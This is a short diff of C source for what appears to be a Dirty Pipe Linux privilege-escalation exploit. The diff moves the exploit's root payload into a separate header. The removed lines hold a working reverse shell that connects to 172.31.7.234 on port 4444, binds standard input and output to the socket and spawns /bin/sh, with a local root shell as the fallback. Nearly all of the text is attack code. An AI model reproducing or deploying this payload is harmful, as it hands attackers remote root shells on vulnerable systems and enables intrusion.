@@ -43,6 +43,7 @@
 #include <pthread.h>
 #include <errno.h>
 #include <sys/prctl.h>
+#include <root_payload.h>
 
 #include "dirtypipe.h"
 
@@ -209,43 +210,6 @@ int main(int argc, char **argv) {
 	}
 
 	return 0;
-}
-
-#define REVERSE_SHELL
-
-void root_payload() {
-#ifdef REVERSE_SHELL
-	int sock;
-	struct sockaddr_in target;
-
-	// Create the socket
-	sock = socket(AF_INET, SOCK_STREAM, 0);
-	if (sock < 0) {
-		perror("socket");
-		exit(1);
-	}
-
-	// Configure the target address
-	target.sin_family = AF_INET;
-	target.sin_port = htons(4444);  // Port 4444
-	inet_pton(AF_INET, "172.31.7.234", &target.sin_addr);  // IP address
-
-	// Connect to the target
-	if (connect(sock, (struct sockaddr *)&target, sizeof(target)) < 0) {
-		perror("connect");
-		exit(1);
-	}
-
-	// Redirect stdin, stdout, stderr to the socket
-	dup2(sock, 0);
-	dup2(sock, 1);
-	dup2(sock, 2);
-
-	// Spawn the shell
-	execl("/bin/sh", "sh", NULL);
-#else
-	execlp("/bin/sh","/bin/sh",NULL);
-#endif
 }
 
 // #define SYS_pidfd_getfd 438
